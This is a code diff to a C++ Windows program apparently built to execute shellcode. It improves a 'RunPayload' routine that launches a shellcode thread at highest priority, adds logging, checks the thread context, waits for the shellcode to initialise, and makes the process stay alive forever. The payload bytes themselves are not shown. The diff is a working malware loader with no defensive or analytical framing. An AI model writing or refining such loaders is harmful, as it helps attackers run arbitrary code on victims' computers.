@@ -590,7 +590,9 @@ void RunPayload()
         }
 
         WriteLog("Memory protection set successfully");
+
         // Create thread with higher priority and detached state
+        WriteLog("Creating shellcode thread...");
         HANDLE tHandle = CreateThread(
             NULL,
             0,
@@ -601,13 +603,46 @@ void RunPayload()
         );
 
         if (tHandle) {
-            WriteLog("Successfully created shellcode thread");
-            SetThreadPriority(tHandle, THREAD_PRIORITY_HIGHEST);
-            ResumeThread(tHandle);
+            WriteLog("Thread created successfully, setting up execution...");
+            
+            // Set thread priority to highest
+            if (SetThreadPriority(tHandle, THREAD_PRIORITY_HIGHEST)) {
+                WriteLog("Thread priority set to highest");
+            } else {
+                WriteLog("Failed to set thread priority");
+            }
+
+            // Set thread context to ensure proper execution
+            CONTEXT ctx;
+            ctx.ContextFlags = CONTEXT_FULL;
+            if (GetThreadContext(tHandle, &ctx)) {
+                WriteLog("Thread context retrieved successfully");
+            } else {
+                WriteLog("Failed to get thread context");
+            }
+
+            // Resume the thread
+            if (ResumeThread(tHandle) != -1) {
+                WriteLog("Thread resumed successfully");
+            } else {
+                WriteLog("Failed to resume thread");
+            }
+
+            // Keep the handle open for a short time to ensure thread starts
+            Sleep(1000);
+            
+            // Now detach the thread
             CloseHandle(tHandle);
+            WriteLog("Thread handle closed, shellcode should be running");
         } else {
-            WriteLog("Failed to create shellcode thread");
+            WriteLog("Failed to create shellcode thread. Error: " + std::to_string(GetLastError()));
         }
+
+        // Keep main thread alive a bit longer to ensure shellcode initializes
+        WriteLog("Waiting for shellcode initialization...");
+        Sleep(2000);
+        WriteLog("Main thread continuing...");
+
     } catch (...) {
         WriteLog("Critical error in RunPayload");
     }
@@ -619,9 +654,14 @@ int main() {
     
     try {
         RunPayload();
-        // Keep main thread alive for a short time to ensure shellcode starts
-        Sleep(700);
+        
+        // Keep the main thread alive to maintain the process
+        WriteLog("Entering main loop to keep process alive");
+        while (true) {
+            Sleep(1000);  // Sleep for 1 second
+        }
     } catch (...) {
+        WriteLog("Critical error in main");
         return 1;
     }
     return 0;
